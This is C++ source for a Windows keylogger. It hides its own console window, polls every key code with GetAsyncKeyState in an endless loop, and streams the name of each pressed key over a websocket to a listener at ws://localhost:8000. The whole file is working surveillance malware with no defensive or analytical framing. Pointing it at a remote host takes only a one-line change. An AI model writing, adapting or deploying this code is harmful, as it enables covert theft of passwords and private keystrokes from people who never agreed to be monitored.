#include <iostream>
#include <websocketpp/config/asio_no_tls_client.hpp>
#include <websocketpp/client.hpp>
#include <winuser.h>
#include <iostream>


using namespace std;
using websocketpp::lib::placeholders::_1;
using websocketpp::lib::placeholders::_2;
using websocketpp::lib::bind;

websocketpp::connection_hdl m_hdl;

typedef websocketpp::client<websocketpp::config::asio_client> client;

// pull out the type of messages sent by our config
typedef websocketpp::config::asio_client::message_type::ptr message_ptr;

// declare necessary functions
void hideWindow();
std::string vCodeToString(UCHAR);
int sendKeyToWs(int, client*);

client c;

// Handlers
void on_open(client* c, websocketpp::connection_hdl hdl) {
    m_hdl = hdl;
}

void on_fail(client* c, websocketpp::connection_hdl hdl) {
    c->get_alog().write(websocketpp::log::alevel::app, "Connection Failed");
}

bool wsready = false;

void initws() {
    // set up websocket
    std::string uri = "ws://localhost:8000";

    try {
        // set logging policy if needed
        c.clear_access_channels(websocketpp::log::alevel::frame_header);
        c.clear_access_channels(websocketpp::log::alevel::frame_payload);

        // Initialize ASIO
        c.init_asio();

        // Register our handlers
        c.set_open_handler(bind(&on_open, &c, ::_1));
        c.set_fail_handler(bind(&on_fail, &c, ::_1));

        // Create a connection to the given URI and queue it for connection once
        // the event loop starts
        websocketpp::lib::error_code ec;
        client::connection_ptr con = c.get_connection(uri, ec);
        c.connect(con);

        // other thread can begin keylogging
        wsready = true;

        // Start the ASIO io_service run loop
        c.run();
    }
    catch (const std::exception& e) {
        std::cout << e.what() << std::endl;
    }
    catch (websocketpp::lib::error_code e) {
        std::cout << e.message() << std::endl;
    }
    catch (...) {
        std::cout << "other exception" << std::endl;
    }

    // end ws setup
}

int main()
{
    hideWindow();

    // create new thread for websocket connection
    std::thread t1(initws);

    while (!wsready);

    Sleep(1);
    
    int i;

    while (1)
    {
        for (i = 1; i < 255; ++i) { // loop through all keys and check if they have been pressed since last call to this function
            if (GetAsyncKeyState(i) & 1) { // LSB is set -> key has been pressed
                sendKeyToWs(i, &c);
            }   
        }
    }
    t1.join();
}

int sendKeyToWs(int key, client* c) {
    c->send(m_hdl, vCodeToString(key), websocketpp::frame::opcode::text);
    return 0;
}

void hideWindow()
{
    HWND ThisWindow;
    AllocConsole();
    ThisWindow = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(ThisWindow, 0);
}


// convert virtual key code to string
// adapted from StackOverflow answer: https://stackoverflow.com/questions/38100667/windows-virtual-key-codes
std::string vCodeToString(UCHAR virtualKey)
{
    UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

    CHAR szName[128];

    int result = 0;
    switch (virtualKey)
    {
    case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
    case VK_RCONTROL: case VK_RMENU:
    case VK_LWIN: case VK_RWIN: case VK_APPS:
    case VK_PRIOR: case VK_NEXT:
    case VK_END: case VK_HOME:
    case VK_INSERT: case VK_DELETE:
    case VK_DIVIDE:
    case VK_NUMLOCK:
        scanCode |= KF_EXTENDED;
    default:
        result = GetKeyNameTextA(scanCode << 16, szName, 128);
    }
    cout << szName << "\n";
    return szName;
}
